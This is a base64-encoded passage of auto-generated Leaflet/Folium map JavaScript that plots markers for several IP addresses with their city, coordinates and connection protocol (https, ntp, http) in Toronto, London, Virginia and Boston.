AogICAgCiAgICAgICAgdmFyIG1hcmtlcl9kNDg4ZWY5OWE1MTE0YTVhODFjZGQzMjM4ZDA0NzMxNyA9IEwubWFya2VyKAogICAgICAgICAgICBbNDMuNjY1NSwgLTc5LjQyMDRdLAogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpY29uOiBuZXcgTC5JY29uLkRlZmF1bHQoKQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICApLmFkZFRvKG1hcF82MjFkYTNkNzMzZDY0OTMwOTEzYmNiZjhkN2QwZjZkNSk7CiAgICAgICAgCiAgICAKCiAgICAgICAgICAgICAgICB2YXIgaWNvbl9lZDMxYTE5NzFmNWI0YzNjYWUwODg4MjY4YmUxNGVjNSA9IEwuQXdlc29tZU1hcmtlcnMuaWNvbih7CiAgICAgICAgICAgICAgICAgICAgaWNvbjogJ2luZm8tc2lnbicsCiAgICAgICAgICAgICAgICAgICAgaWNvbkNvbG9yOiAnd2hpdGUnLAogICAgICAgICAgICAgICAgICAgIG1hcmtlckNvbG9yOiAnYmx1ZScsCiAgICAgICAgICAgICAgICAgICAgcHJlZml4OiAnZ2x5cGhpY29uJywKICAgICAgICAgICAgICAgICAgICBleHRyYUNsYXNzZXM6ICdmYS1yb3RhdGUtMCcKICAgICAgICAgICAgICAgICAgICB9KTsKICAgICAgICAgICAgICAgIG1hcmtlcl9kNDg4ZWY5OWE1MTE0YTVhODFjZGQzMjM4ZDA0NzMxNy5zZXRJY29uKGljb25fZWQzMWExOTcxZjViNGMzY2FlMDg4ODI2OGJlMTRlYzUpOwogICAgICAgICAgICAKICAgIAogICAgICAgICAgICB2YXIgcG9wdXBfYmVkNzVkNGVhMmQwNGFhNmIxZTM3YzcyYzc1MTE2MmYgPSBMLnBvcHVwKHttYXhXaWR0aDogJzMwMCcKICAgICAgICAgICAgCiAgICAgICAgICAgIH0pOwoKICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2YXIgaHRtbF9hYTJjYmJjZGI1NTA0OGI4OGFjNTkzMzM0ZmVlYjY2MiA9ICQoYDxkaXYgaWQ9Imh0bWxfYWEyY2JiY2RiNTUwNDhiODhhYzU5MzMzNGZlZWI2NjIiIHN0eWxlPSJ3aWR0aDogMTAwLjAlOyBoZWlnaHQ6IDEwMC4wJTsiPkNvdW50cnlDb2RlPUNBLCBDb3VudHJ5TmFtZT1DYW5hZGEsIFN0YXRlPU9udGFyaW8sIENpdHk9VG9yb250bywgTG9uZ2l0dWRlPS03OS40MjA0LCBMYXRpdHVkZT00My42NjU1PGJyPjEzLjg4LjI1NS4xMTU8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwX2JlZDc1ZDRlYTJkMDRhYTZiMWUzN2M3MmM3NTExNjJmLnNldENvbnRlbnQoaHRtbF9hYTJjYmJjZGI1NTA0OGI4OGFjNTkzMzM0ZmVlYjY2Mik7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2Q0ODhlZjk5YTUxMTRhNWE4MWNkZDMyMzhkMDQ3MzE3LmJpbmRQb3B1cChwb3B1cF9iZWQ3NWQ0ZWEyZDA0YWE2YjFlMzdjNzJjNzUxMTYyZikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfZDQ4OGVmOTlhNTExNGE1YTgxY2RkMzIzOGQwNDczMTcuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgVG9yb250bywgQ2FuYWRhLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2M5ZjRjMGI2MWJkNDRlZTA5NmViMWRkMmNjNTNjN2FkID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs1MS41MTQyLCAtMC4wOTMxXSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fMGUwMjk5ZjhkYTMxNGEwNWE4MzhlYmRlMWMwN2VlZjYgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYzlmNGMwYjYxYmQ0NGVlMDk2ZWIxZGQyY2M1M2M3YWQuc2V0SWNvbihpY29uXzBlMDI5OWY4ZGEzMTRhMDVhODM4ZWJkZTFjMDdlZWY2KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzA0ZWQwMjhhNmMwNjRkZTU4YWQ0N2YwMGEyNjJmYzBiID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfMjMwYjg5OWMzMzJlNGQ0OTg3OGYyMDYzZTM3Njg5ZWQgPSAkKGA8ZGl2IGlkPSJodG1sXzIzMGI4OTljMzMyZTRkNDk4NzhmMjA2M2UzNzY4OWVkIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1HQiwgQ291bnRyeU5hbWU9VW5pdGVkIEtpbmdkb20sIFN0YXRlPUVuZ2xhbmQsIENpdHk9TG9uZG9uLCBMb25naXR1ZGU9LTAuMDkzMSwgTGF0aXR1ZGU9NTEuNTE0Mjxicj45MS4xODkuOTQuNDxicj5wcm90b2NvbD1udHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzA0ZWQwMjhhNmMwNjRkZTU4YWQ0N2YwMGEyNjJmYzBiLnNldENvbnRlbnQoaHRtbF8yMzBiODk5YzMzMmU0ZDQ5ODc4ZjIwNjNlMzc2ODllZCk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2M5ZjRjMGI2MWJkNDRlZTA5NmViMWRkMmNjNTNjN2FkLmJpbmRQb3B1cChwb3B1cF8wNGVkMDI4YTZjMDY0ZGU1OGFkNDdmMDBhMjYyZmMwYikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYzlmNGMwYjYxYmQ0NGVlMDk2ZWIxZGQyY2M1M2M3YWQuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgTG9uZG9uLCBVbml0ZWQgS2luZ2RvbSwgcHJvdG9jb2w9bnRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfYzJmNDVhMGI4MzE3NGI5NGEwNGE2MDQ5NjA4MTkzNDQgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNzE2N2Y3MzU1ZmFkNDM1YmJiZjQ2MWY0NGI3ODg2MjQgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfYzJmNDVhMGI4MzE3NGI5NGEwNGE2MDQ5NjA4MTkzNDQuc2V0SWNvbihpY29uXzcxNjdmNzM1NWZhZDQzNWJiYmY0NjFmNDRiNzg4NjI0KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzI5MDU5YWU3YWI1ODQ3YTJiNTc1NmYzZjQ4YTIyOTM2ID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNzJmMWE2ZmYyN2FkNDU2Nzk2MjAyMzU5NjFjNzViNzEgPSAkKGA8ZGl2IGlkPSJodG1sXzcyZjFhNmZmMjdhZDQ1Njc5NjIwMjM1OTYxYzc1YjcxIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIyNi44LjE0ODxicj5wcm90b2NvbD1odHRwczwvZGl2PmApWzBdOwogICAgICAgICAgICAgICAgcG9wdXBfMjkwNTlhZTdhYjU4NDdhMmI1NzU2ZjNmNDhhMjI5MzYuc2V0Q29udGVudChodG1sXzcyZjFhNmZmMjdhZDQ1Njc5NjIwMjM1OTYxYzc1YjcxKTsKICAgICAgICAgICAgCgogICAgICAgICAgICBtYXJrZXJfYzJmNDVhMGI4MzE3NGI5NGEwNGE2MDQ5NjA4MTkzNDQuYmluZFBvcHVwKHBvcHVwXzI5MDU5YWU3YWI1ODQ3YTJiNTc1NmYzZjQ4YTIyOTM2KQogICAgICAgICAgICA7CgogICAgICAgICAgICAKICAgICAgICAKICAgIAogICAgICAgIG1hcmtlcl9jMmY0NWEwYjgzMTc0Yjk0YTA0YTYwNDk2MDgxOTM0NC5iaW5kVG9vbHRpcCgKICAgICAgICAgICAgYDxkaXY+YAogICAgICAgICAgICArIGBXYXNoaW5ndG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwc2AgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyXzNhMzg1ZDBkN2QxZTQ4MWRiMDA5ZmQ4NmU2N2NmNjhjID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFszOC43MTYzLCAtNzguMTcwNF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uX2RhZTFmMjI5ODRiYTRkN2M5YmIyZjYyZDNmY2E4OWQ1ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzNhMzg1ZDBkN2QxZTQ4MWRiMDA5ZmQ4NmU2N2NmNjhjLnNldEljb24oaWNvbl9kYWUxZjIyOTg0YmE0ZDdjOWJiMmY2MmQzZmNhODlkNSk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF85ZDA3NjRkZWEwOTI0MGUzOTFhNmYwN2VhN2FhYWFjZiA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzI1MzkyN2JmYzZiYTQ4OWZhZWNhM2I2ZTlhYjE5ZTk3ID0gJChgPGRpdiBpZD0iaHRtbF8yNTM5MjdiZmM2YmE0ODlmYWVjYTNiNmU5YWIxOWU5NyIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPVZpcmdpbmlhLCBDaXR5PVdhc2hpbmd0b24sIExvbmdpdHVkZT0tNzguMTcwNCwgTGF0aXR1ZGU9MzguNzE2Mzxicj4xMy42OC4xNjUuNjQ8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzlkMDc2NGRlYTA5MjQwZTM5MWE2ZjA3ZWE3YWFhYWNmLnNldENvbnRlbnQoaHRtbF8yNTM5MjdiZmM2YmE0ODlmYWVjYTNiNmU5YWIxOWU5Nyk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyXzNhMzg1ZDBkN2QxZTQ4MWRiMDA5ZmQ4NmU2N2NmNjhjLmJpbmRQb3B1cChwb3B1cF85ZDA3NjRkZWEwOTI0MGUzOTFhNmYwN2VhN2FhYWFjZikKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfM2EzODVkMGQ3ZDFlNDgxZGIwMDlmZDg2ZTY3Y2Y2OGMuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgV2FzaGluZ3RvbiwgVW5pdGVkIFN0YXRlcywgcHJvdG9jb2w9aHR0cHNgICsgYDwvZGl2PmAsCiAgICAgICAgICAgIHsic3RpY2t5IjogdHJ1ZX0KICAgICAgICApOwogICAgICAgIAogICAgCiAgICAgICAgdmFyIG1hcmtlcl80NmE1MjcxNDk4NGU0ZjlmOWMwYzZlOWJlNTJjZmQxYiA9IEwubWFya2VyKAogICAgICAgICAgICBbNTEuNTE0MiwgLTAuMDkzMV0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzY0YTE0M2VhYmUzNTRiOTE4OGVjZDBlMTFjODEzYzliID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyXzQ2YTUyNzE0OTg0ZTRmOWY5YzBjNmU5YmU1MmNmZDFiLnNldEljb24oaWNvbl82NGExNDNlYWJlMzU0YjkxODhlY2QwZTExYzgxM2M5Yik7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF81NmIxZTFhMzRlNmM0YThjOGMwZTQzZTA3ZGY0ZGNmYyA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sXzM4MTQzYmY2NTFlNDQ3ZGNiNWEwNjAxY2MxNmQ3NDIzID0gJChgPGRpdiBpZD0iaHRtbF8zODE0M2JmNjUxZTQ0N2RjYjVhMDYwMWNjMTZkNzQyMyIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9R0IsIENvdW50cnlOYW1lPVVuaXRlZCBLaW5nZG9tLCBTdGF0ZT1FbmdsYW5kLCBDaXR5PUxvbmRvbiwgTG9uZ2l0dWRlPS0wLjA5MzEsIExhdGl0dWRlPTUxLjUxNDI8YnI+OTEuMTg5Ljk0LjQ8YnI+cHJvdG9jb2w9bnRwPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF81NmIxZTFhMzRlNmM0YThjOGMwZTQzZTA3ZGY0ZGNmYy5zZXRDb250ZW50KGh0bWxfMzgxNDNiZjY1MWU0NDdkY2I1YTA2MDFjYzE2ZDc0MjMpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl80NmE1MjcxNDk4NGU0ZjlmOWMwYzZlOWJlNTJjZmQxYi5iaW5kUG9wdXAocG9wdXBfNTZiMWUxYTM0ZTZjNGE4YzhjMGU0M2UwN2RmNGRjZmMpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzQ2YTUyNzE0OTg0ZTRmOWY5YzBjNmU5YmU1MmNmZDFiLmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYExvbmRvbiwgVW5pdGVkIEtpbmdkb20sIHByb3RvY29sPW50cGAgKyBgPC9kaXY+YCwKICAgICAgICAgICAgeyJzdGlja3kiOiB0cnVlfQogICAgICAgICk7CiAgICAgICAgCiAgICAKICAgICAgICB2YXIgbWFya2VyX2FmNmY2MTk1ZWYyZDQ0MWRiMzQzYzQ5MTg5YTgxMDAxID0gTC5tYXJrZXIoCiAgICAgICAgICAgIFs0Mi4zNTg0LCAtNzEuMDU5OF0sCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGljb246IG5ldyBMLkljb24uRGVmYXVsdCgpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICkuYWRkVG8obWFwXzYyMWRhM2Q3MzNkNjQ5MzA5MTNiY2JmOGQ3ZDBmNmQ1KTsKICAgICAgICAKICAgIAoKICAgICAgICAgICAgICAgIHZhciBpY29uXzUxODEyODgyZDMwMTQyMDJiNDhmNjBlMGJmODg2NTQ4ID0gTC5Bd2Vzb21lTWFya2Vycy5pY29uKHsKICAgICAgICAgICAgICAgICAgICBpY29uOiAnaW5mby1zaWduJywKICAgICAgICAgICAgICAgICAgICBpY29uQ29sb3I6ICd3aGl0ZScsCiAgICAgICAgICAgICAgICAgICAgbWFya2VyQ29sb3I6ICdibHVlJywKICAgICAgICAgICAgICAgICAgICBwcmVmaXg6ICdnbHlwaGljb24nLAogICAgICAgICAgICAgICAgICAgIGV4dHJhQ2xhc3NlczogJ2ZhLXJvdGF0ZS0wJwogICAgICAgICAgICAgICAgICAgIH0pOwogICAgICAgICAgICAgICAgbWFya2VyX2FmNmY2MTk1ZWYyZDQ0MWRiMzQzYzQ5MTg5YTgxMDAxLnNldEljb24oaWNvbl81MTgxMjg4MmQzMDE0MjAyYjQ4ZjYwZTBiZjg4NjU0OCk7CiAgICAgICAgICAgIAogICAgCiAgICAgICAgICAgIHZhciBwb3B1cF83OWMxYjcxN2FkODQ0N2I0OTIzOGQ5OTg0NWU4MTg5ZSA9IEwucG9wdXAoe21heFdpZHRoOiAnMzAwJwogICAgICAgICAgICAKICAgICAgICAgICAgfSk7CgogICAgICAgICAgICAKICAgICAgICAgICAgICAgIHZhciBodG1sX2UwNTBmZDIzMjY5NzRmOWNiYzdmNTI5OTc0NGY0YTZhID0gJChgPGRpdiBpZD0iaHRtbF9lMDUwZmQyMzI2OTc0ZjljYmM3ZjUyOTk3NDRmNGE2YSIgc3R5bGU9IndpZHRoOiAxMDAuMCU7IGhlaWdodDogMTAwLjAlOyI+Q291bnRyeUNvZGU9VVMsIENvdW50cnlOYW1lPVVuaXRlZCBTdGF0ZXMsIFN0YXRlPU1hc3NhY2h1c2V0dHMsIENpdHk9Qm9zdG9uLCBMb25naXR1ZGU9LTcxLjA1OTgsIExhdGl0dWRlPTQyLjM1ODQ8YnI+OTEuMTg5LjkxLjIzPGJyPnByb3RvY29sPWh0dHA8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzc5YzFiNzE3YWQ4NDQ3YjQ5MjM4ZDk5ODQ1ZTgxODllLnNldENvbnRlbnQoaHRtbF9lMDUwZmQyMzI2OTc0ZjljYmM3ZjUyOTk3NDRmNGE2YSk7CiAgICAgICAgICAgIAoKICAgICAgICAgICAgbWFya2VyX2FmNmY2MTk1ZWYyZDQ0MWRiMzQzYzQ5MTg5YTgxMDAxLmJpbmRQb3B1cChwb3B1cF83OWMxYjcxN2FkODQ0N2I0OTIzOGQ5OTg0NWU4MTg5ZSkKICAgICAgICAgICAgOwoKICAgICAgICAgICAgCiAgICAgICAgCiAgICAKICAgICAgICBtYXJrZXJfYWY2ZjYxOTVlZjJkNDQxZGIzNDNjNDkxODlhODEwMDEuYmluZFRvb2x0aXAoCiAgICAgICAgICAgIGA8ZGl2PmAKICAgICAgICAgICAgKyBgQm9zdG9uLCBVbml0ZWQgU3RhdGVzLCBwcm90b2NvbD1odHRwYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfMmFkYTBiODk4MmVmNDBiNjg3Y2I1NWY1MDk4ODJlZjQgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fNWU2NThkMjUxNjFkNGQ2YmI4NGZjYzAwOWJhZTljZTUgPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfMmFkYTBiODk4MmVmNDBiNjg3Y2I1NWY1MDk4ODJlZjQuc2V0SWNvbihpY29uXzVlNjU4ZDI1MTYxZDRkNmJiODRmY2MwMDliYWU5Y2U1KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwX2ExYTkzNDkwOWIwNTQ1NjRhOTZhNjZmZmRhMWVjOGYyID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfNDEyNjhiNWUwOTI2NDViZTkzNDhiZDlhMzk1NGM2ZTcgPSAkKGA8ZGl2IGlkPSJodG1sXzQxMjY4YjVlMDkyNjQ1YmU5MzQ4YmQ5YTM5NTRjNmU3IiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjUyLjIzOS4xNTIuMTM4PGJyPnByb3RvY29sPWh0dHBzPC9kaXY+YClbMF07CiAgICAgICAgICAgICAgICBwb3B1cF9hMWE5MzQ5MDliMDU0NTY0YTk2YTY2ZmZkYTFlYzhmMi5zZXRDb250ZW50KGh0bWxfNDEyNjhiNWUwOTI2NDViZTkzNDhiZDlhMzk1NGM2ZTcpOwogICAgICAgICAgICAKCiAgICAgICAgICAgIG1hcmtlcl8yYWRhMGI4OTgyZWY0MGI2ODdjYjU1ZjUwOTg4MmVmNC5iaW5kUG9wdXAocG9wdXBfYTFhOTM0OTA5YjA1NDU2NGE5NmE2NmZmZGExZWM4ZjIpCiAgICAgICAgICAgIDsKCiAgICAgICAgICAgIAogICAgICAgIAogICAgCiAgICAgICAgbWFya2VyXzJhZGEwYjg5ODJlZjQwYjY4N2NiNTVmNTA5ODgyZWY0LmJpbmRUb29sdGlwKAogICAgICAgICAgICBgPGRpdj5gCiAgICAgICAgICAgICsgYFdhc2hpbmd0b24sIFVuaXRlZCBTdGF0ZXMsIHByb3RvY29sPWh0dHBzYCArIGA8L2Rpdj5gLAogICAgICAgICAgICB7InN0aWNreSI6IHRydWV9CiAgICAgICAgKTsKICAgICAgICAKICAgIAogICAgICAgIHZhciBtYXJrZXJfZTg0NjQ2MTI2ZjkyNGUzYjlmMGYyNGZiYmFiMzQ1MGYgPSBMLm1hcmtlcigKICAgICAgICAgICAgWzM4LjcxNjMsIC03OC4xNzA0XSwKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWNvbjogbmV3IEwuSWNvbi5EZWZhdWx0KCkKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgKS5hZGRUbyhtYXBfNjIxZGEzZDczM2Q2NDkzMDkxM2JjYmY4ZDdkMGY2ZDUpOwogICAgICAgIAogICAgCgogICAgICAgICAgICAgICAgdmFyIGljb25fYTM2MGJhNDVmMzYzNDA0N2IzZDZmYWJjNjE1NDg3YjggPSBMLkF3ZXNvbWVNYXJrZXJzLmljb24oewogICAgICAgICAgICAgICAgICAgIGljb246ICdpbmZvLXNpZ24nLAogICAgICAgICAgICAgICAgICAgIGljb25Db2xvcjogJ3doaXRlJywKICAgICAgICAgICAgICAgICAgICBtYXJrZXJDb2xvcjogJ2JsdWUnLAogICAgICAgICAgICAgICAgICAgIHByZWZpeDogJ2dseXBoaWNvbicsCiAgICAgICAgICAgICAgICAgICAgZXh0cmFDbGFzc2VzOiAnZmEtcm90YXRlLTAnCiAgICAgICAgICAgICAgICAgICAgfSk7CiAgICAgICAgICAgICAgICBtYXJrZXJfZTg0NjQ2MTI2ZjkyNGUzYjlmMGYyNGZiYmFiMzQ1MGYuc2V0SWNvbihpY29uX2EzNjBiYTQ1ZjM2MzQwNDdiM2Q2ZmFiYzYxNTQ4N2I4KTsKICAgICAgICAgICAgCiAgICAKICAgICAgICAgICAgdmFyIHBvcHVwXzlkOGUyZTI3ZjE0YjQ5ZjhiYzYxZWVjNjZmMzFmNTdlID0gTC5wb3B1cCh7bWF4V2lkdGg6ICczMDAnCiAgICAgICAgICAgIAogICAgICAgICAgICB9KTsKCiAgICAgICAgICAgIAogICAgICAgICAgICAgICAgdmFyIGh0bWxfOWZlZTRmYzE4OWM4NDUwYzhmNWExM2M5ZjVkOGQ1NjAgPSAkKGA8ZGl2IGlkPSJodG1sXzlmZWU0ZmMxODljODQ1MGM4ZjVhMTNjOWY1ZDhkNTYwIiBzdHlsZT0id2lkdGg6IDEwMC4wJTsgaGVpZ2h0OiAxMDAuMCU7Ij5Db3VudHJ5Q29kZT1VUywgQ291bnRyeU5hbWU9VW5pdGVkIFN0YXRlcywgU3RhdGU9VmlyZ2luaWEsIENpdHk9V2FzaGluZ3RvbiwgTG9uZ2l0dWRlPS03OC4xNzA0LCBMYXRpdHVkZT0zOC43MTYzPGJyPjE2OC42Mi4zMi4yMTI8YnI+cHJvdG9jb2w9aHR0cHM8L2Rpdj5gKVswXTsKICAgICAgICAgICAgICAgIHBvcHVwXzlkOGUyZTI3ZjE0YjQ5ZjhiYzYxZWVjNjZmMzFmNTdlLnNldENvbnRlbnQoaHRtbF85ZmVlNGZjMTg5Yzg0NTBjOGY1YTEzYzlmNWQ4ZDU2MCk7